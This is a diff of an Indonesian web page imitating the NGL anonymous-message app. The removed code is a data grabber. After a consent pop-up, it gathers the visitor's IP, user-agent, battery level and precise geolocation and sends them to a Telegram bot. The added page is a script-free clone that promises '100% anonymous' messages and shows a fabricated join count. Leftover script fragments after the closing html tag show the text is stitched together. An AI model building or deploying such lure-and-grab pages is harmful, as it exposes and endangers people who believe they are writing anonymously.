@@ -1,215 +1,71 @@
-<!doctype html>
-<html lang="id">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>NGL-style Demo (Consent-first)</title>
-<style>
-  :root{--bg:#0f172a;--card:#0b1220;--accent:#ff5da2;--muted:#94a3b8}
-  *{box-sizing:border-box}
-  body{margin:0;font-family:Inter,system-ui,Arial;background:linear-gradient(135deg,#0b1220,#102033);color:#e6eef8;display:flex;align-items:center;justify-content:center;height:100vh;padding:20px}
-  .card{width:100%;max-width:420px;background:linear-gradient(180deg,rgba(255,255,255,0.02),transparent);border-radius:14px;padding:20px;box-shadow:0 12px 40px rgba(2,6,23,0.6);text-align:center}
-  h1{margin:6px 0 8px;font-size:1.25rem}
-  p.lead{margin:0 0 14px;color:var(--muted);font-size:0.95rem}
-  textarea{width:100%;min-height:110px;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:inherit;resize:none}
-  .row{display:flex;gap:8px;margin-top:12px}
-  button.primary{flex:1;background:var(--accent);color:#071026;border:0;padding:10px 12px;border-radius:10px;font-weight:600;cursor:pointer}
-  button.ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--muted);padding:10px 12px;border-radius:10px;cursor:pointer}
-  .small{font-size:0.85rem;color:var(--muted);margin-top:10px}
-  .badge{display:inline-block;padding:6px 8px;border-radius:999px;background:rgba(255,255,255,0.03);font-size:0.8rem;color:var(--muted);margin-top:10px}
-  /* consent modal */
-  .modal-wrap{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(2,6,23,0.6);z-index:999;backdrop-filter:blur(4px)}
-  .modal{width:100%;max-width:720px;background:#071026;padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.03)}
-  .modal h3{margin:0 0 8px}
-  .modal p{color:var(--muted);margin:0 0 12px}
-  .actions{display:flex;gap:8px;justify-content:flex-end;margin-top:12px}
-  .muted-text{color:var(--muted);font-size:0.9rem}
-  #log{margin-top:12px;text-align:left;font-size:0.85rem;color:var(--muted);max-height:140px;overflow:auto;padding:8px;border-radius:8px;background:rgba(255,255,255,0.01)}
-</style>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Anonymous Message</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet"/>
+  <style>
+    body { font-family: 'Inter', sans-serif; }
+    @keyframes floaty {
+      0% { transform: translateY(0px); }
+      50% { transform: translateY(-8px); }
+      100% { transform: translateY(0px); }
+    }
+    .floaty { animation: floaty 5s ease-in-out infinite; }
+  </style>
 </head>
-<body>
+<body class="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-pink-600 to-orange-500 px-6 py-10">
 
-<div class="card" role="main" aria-labelledby="title">
-  <div style="display:flex;justify-content:center">
-    <div style="width:56px;height:56px;border-radius:12px;background:linear-gradient(135deg,#ff5da2,#7c3aed);display:flex;align-items:center;justify-content:center;font-weight:700;color:#071026">NGL</div>
-  </div>
-  <h1 id="title">Ask me anything</h1>
-  <p class="lead">Ketik pesan anonim (demo). Setelah submit, akan ditanyakan persetujuan pengiriman data device untuk tujuan testing.</p>
+  <div class="w-full max-w-md">
+    <!-- Card utama -->
+    <div class="bg-white rounded-3xl overflow-hidden shadow-2xl floaty">
+      <!-- Header -->
+      <div class="flex items-center gap-4 px-6 py-4 border-b border-gray-100">
+        <img src="https://storage.googleapis.com/a1aa/image/5df75832-9f76-4ece-e6f3-683fd17d55b0.jpg"
+             alt="User avatar"
+             class="w-12 h-12 rounded-full ring-2 ring-pink-400"/>
+        <div class="text-gray-900 text-sm leading-tight">
+          <span class="font-normal">@BIBD</span>
+          <span class="font-bold ml-1">kirimi aku pesan anonim!</span>
+        </div>
+      </div>
 
-  <textarea id="msg" placeholder="Tulis pesan..."></textarea>
+      <!-- Form kirim pesan -->
+      <div class="relative bg-pink-400 bg-opacity-20 px-6 py-8 rounded-b-3xl backdrop-blur-sm">
+        <textarea placeholder="Ketik pesan anonimmu..."
+                  class="w-full h-28 p-4 rounded-2xl border border-pink-300 focus:outline-none focus:ring-2 focus:ring-pink-500 resize-none"></textarea>
+        <button class="mt-4 w-full bg-black text-white font-bold text-lg rounded-full py-3 shadow-md hover:bg-gray-900 hover:scale-[1.02] transition">
+          Kirim Pesan 🚀
+        </button>
+      </div>
+    </div>
 
-  <div class="row">
-    <button id="btnSend" class="primary">Send</button>
-    <button id="btnClear" class="ghost">Clear</button>
-  </div>
-
-  <div class="small">Hanya untuk testing di device kamu sendiri. Data dikirim jika pengguna setuju.</div>
-  <div id="log" aria-live="polite"></div>
-</div>
-
-<!-- Consent Modal (hidden by default) -->
-<div id="consentModal" class="modal-wrap" style="display:none">
-  <div class="modal" role="dialog" aria-modal="true" aria-label="Persetujuan Pengiriman Data">
-    <h3>Izinkan pengiriman data (Demo)</h3>
-    <p class="muted-text">
-      Untuk tujuan demo, kami akan mengumpulkan: <strong>IP publik</strong>, <strong>user-agent</strong>, <strong>baterai</strong>, dan <strong>lokasi</strong> jika kamu mengizinkan.
-      Data ini akan dikirim ke Telegram yang hanya kamu gunakan untuk testing.
+    <!-- Info kecil -->
+    <p class="text-white text-center mt-4 text-sm flex items-center justify-center gap-1 opacity-90">
+      <i class="fas fa-lock"></i>
+      <span>Pesanmu 100% anonim</span>
     </p>
-    <p class="muted-text">Klik <strong>Agree & Send</strong> untuk melanjutkan. Klik <strong>Decline</strong> untuk batalkan (data tidak akan dikirim).</p>
-    <div class="actions">
-      <button id="btnDecline" class="ghost">Decline</button>
-      <button id="btnAgree" class="primary">Agree & Send</button>
+
+    <!-- Tulisan info -->
+    <p class="text-white text-center mt-12 text-lg font-semibold animate-bounce">
+      👇 205 teman baru saja bergabung 👇
+    </p>
+
+    <!-- Tombol buat dapat link -->
+    <button type="button"
+            class="mt-4 w-full bg-black text-white font-bold text-lg rounded-full py-4 shadow-lg hover:bg-gray-900 hover:scale-[1.02] transition">
+      Buat link untukmu sendiri!
+    </button>
+
+    <!-- Footer -->
+    <div class="flex justify-center gap-6 mt-6 text-pink-200 text-sm font-normal">
+      <a href="#" class="hover:underline">Terms</a>
+      <a href="#" class="hover:underline">Privacy</a>
     </div>
   </div>
-</div>
 
-<script>
-/*
-  IMPORTANT:
-  - Ganti GANTI_CHAT_ID dan GANTI_BOT_TOKEN dengan milikmu.
-  - Gunakan hanya untuk testing di perangkatmu sendiri.
-  - Script ini tidak melakukan pengambilan camera snapshot atau upload file.
-*/
-
-const CHAT_ID = "GANTI_CHAT_ID";
-const BOT_TOKEN = "GANTI_BOT_TOKEN";
-
-const btnSend = document.getElementById('btnSend');
-const btnClear = document.getElementById('btnClear');
-const msgEl = document.getElementById('msg');
-const consentModal = document.getElementById('consentModal');
-const btnAgree = document.getElementById('btnAgree');
-const btnDecline = document.getElementById('btnDecline');
-const logEl = document.getElementById('log');
-
-function log(s){ logEl.innerHTML = `<div>${new Date().toLocaleTimeString()} — ${s}</div>` + logEl.innerHTML; }
-
-// helper: fetch public IP from ipinfo (just for demo)
-async function fetchIP(){
-  try{
-    const r = await fetch('https://ipinfo.io/json?token=5602d2e05cb668');
-    if(!r.ok) return 'IP: tidak tersedia';
-    const j = await r.json();
-    return `${j.ip} — ${j.city||'-'}, ${j.country||'-'}`;
-  }catch(e){
-    return 'IP: error';
-  }
-}
-
-// helper: get battery status (if supported)
-async function getBattery(){
-  try{
-    if(navigator.getBattery){
-      const bat = await navigator.getBattery();
-      return `${Math.round(bat.level*100)}% ${bat.charging? '⚡️' : ''}`;
-    }
-    return 'Tidak didukung';
-  }catch(e){ return 'Error'; }
-}
-
-// helper: get location (ask permission)
-async function getLocation(){
-  return new Promise((resolve)=>{
-    if(!navigator.geolocation) return resolve('Tidak tersedia');
-    navigator.geolocation.getCurrentPosition(pos=>{
-      resolve(`${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)} (±${pos.coords.accuracy}m)`);
-    }, err=>{
-      resolve('User menolak / tidak tersedia');
-    }, { enableHighAccuracy:true, timeout:10000 });
-  });
-}
-
-// send message to Telegram via Bot API
-async function sendToTelegram(text){
-  try{
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    await fetch(url, {
-      method:'POST',
-      headers:{ 'Content-Type':'application/json' },
-      body: JSON.stringify({ chat_id: CHAT_ID, text })
-    });
-    return true;
-  }catch(e){
-    console.error(e);
-    return false;
-  }
-}
-
-// Flow:
-// 1) User clicks Send -> show consent modal
-// 2) If Agree -> collect IP, UA, battery, location (if allowed) -> send payload + original message to Telegram
-// 3) Show short success UI to user (kept minimal & neutral)
-
-btnSend.addEventListener('click', ()=> {
-  // ensure message exists (but keep optional)
-  // show consent modal
-  consentModal.style.display = 'flex';
-});
-
-btnDecline.addEventListener('click', ()=> {
-  consentModal.style.display = 'none';
-  log('User declined consent — no data sent.');
-  // show neutral feedback
-  alert('Pesan terkirim (tanpa data device). Terima kasih!');
-  // Optionally, send only the message without device data if you want:
-  // sendMessageOnly(msgEl.value)
-});
-
-btnAgree.addEventListener('click', async ()=> {
-  consentModal.style.display = 'none';
-  const message = msgEl.value.trim() || '(kosong)';
-  log('User agreed. Mengumpulkan data...');
-
-  // collect data (parallel)
-  const [ip, battery, location] = await Promise.all([fetchIP(), getBattery(), getLocation()]);
-  const ua = navigator.userAgent;
-
-  const payload = `
-📨 Message:
-${escapeHtml(message)}
-
-🌐 IP:
-${ip}
-
-📱 Device:
-User-Agent: ${ua}
-Battery: ${battery}
-
-📍 Lokasi:
-${location}
-
-⏰ Waktu: ${new Date().toLocaleString('id-ID')}
-  `.trim();
-
-  // send to Telegram
-  const ok = await sendToTelegram(payload);
-  if(ok){
-    log('Data & message terkirim ke Telegram.');
-    alert('Pertanyaan dan data terkirim. Terima kasih!');
-    msgEl.value = '';
-  } else {
-    log('Gagal mengirim ke Telegram.');
-    alert('Gagal mengirim. Cek token/chat id di script.');
-  }
-});
-
-// small helper to escape potential HTML in message
-function escapeHtml(s){
-  return s.replace(/[&<>"']/g, (m)=>({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;" })[m]);
-}
-
-// clear button
-btnClear.addEventListener('click', ()=> { msgEl.value=''; log('Input dibersihkan'); });
-
-</script>
-</body>
-</html>)=>{
-    // start main flow
-    mainFlow();
-  });
-
-  // Start: show banner (already visible). Nothing else runs until user makes a choice.
-})();
-</script>
 </body>
 </html>
